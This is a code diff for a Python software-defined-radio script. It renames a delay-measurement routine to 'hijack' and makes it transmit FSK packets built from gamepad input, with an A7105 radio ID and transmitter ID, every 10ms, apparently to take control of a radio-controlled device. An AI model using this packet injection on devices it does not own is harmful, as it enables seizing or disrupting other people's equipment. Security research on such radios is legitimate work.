@@ -35,7 +35,7 @@ def generate_packet(gamepad_state, sync, txid, deviation, data_rate, samp_rate):
     isyms = interp(syms, int(samp_rate / data_rate))
     return fskmod(isyms, deviation, samp_rate)
 
-def measure_delay(
+def hijack(
     args,
     rate,
     freq=None,
@@ -50,7 +50,7 @@ def measure_delay(
     clockRate=None,
     numRxSamps=10000,
     dumpDir=None,
-    syncWord=None,
+    a7105ID=None,
     txID=None,
 ):
     gp = gamepad.Gamepad()
@@ -107,11 +107,13 @@ def measure_delay(
             if ss.ret != SOAPY_SDR_TIMEOUT:
                 print "Status: %s" % str(ss)
 
+            # wait 2ms for the previous packet to finish sending
             if sdr.getHardwareTime() > (txTime + long(2e6)):
+                # send packets every 10ms
                 txTime += long(10e6)
-                txPulse = generate_packet(gamepad_state=gp.get_state(), sync=syncWord, txid=txID, deviation=186e3, data_rate=100e3, samp_rate=rate)
-                sr = sdr.writeStream(txStream, [txPulse], len(txPulse), txFlags, txTime, timeoutUs=1000)
-                if sr.ret != len(txPulse):
+                packet = generate_packet(gamepad_state=gp.get_state(), sync=a7105ID, txid=txID, deviation=186e3, data_rate=100e3, samp_rate=rate)
+                sr = sdr.writeStream(txStream, [packet], len(packet), txFlags, txTime, timeoutUs=1000)
+                if sr.ret != len(packet):
                     raise Exception('transmit failed %s'%str(sr))
         except KeyboardInterrupt:
             break
@@ -126,7 +128,7 @@ def measure_delay(
 def main():
     parser = OptionParser()
     parser.add_option("--args", type="string", dest="args", help="device factor arguments", default="")
-    parser.add_option("--rate", type="float", dest="rate", help="Tx and Rx sample rate", default=1e6)
+    parser.add_option("--rate", type="float", dest="rate", help="Tx and Rx sample rate", default=4e6)
     parser.add_option("--rxAnt", type="string", dest="rxAnt", help="Optional Rx antenna", default=None)
     parser.add_option("--txAnt", type="string", dest="txAnt", help="Optional Tx antenna", default=None)
     parser.add_option("--rxGain", type="float", dest="rxGain", help="Optional Rx gain (dB)", default=None)
@@ -138,10 +140,10 @@ def main():
     parser.add_option("--freq", type="float", dest="freq", help="Optional Tx and Rx freq (Hz)", default=None)
     parser.add_option("--clockRate", type="float", dest="clockRate", help="Optional clock rate (Hz)", default=None)
     parser.add_option("--dumpDir", type="string", dest="dumpDir", help="Optional directory to dump debug samples", default=None)
-    parser.add_option("--syncWord", type="int", dest="syncWord", help="Optional sync word", default=None)
-    parser.add_option("--txID", type="int", dest="txID", help="Optional TX ID", default=None)
+    parser.add_option("--a7105ID", type="int", dest="a7105ID", help="Optional sync word", default=1)
+    parser.add_option("--txID", type="int", dest="txID", help="Optional TX ID", default=1)
     (options, args) = parser.parse_args()
-    measure_delay(
+    hijack(
         args=options.args,
         rate=options.rate,
         freq=options.freq,
@@ -155,8 +157,9 @@ def main():
         txChan=options.txChan,
         clockRate=options.clockRate,
         dumpDir=options.dumpDir,
-        syncWord=options.syncWord,
+        a7105ID=options.a7105ID,
         txID=options.txID,
     )
 
-if __name__ == '__main__': main()
+if __name__ == '__main__':
+    main()
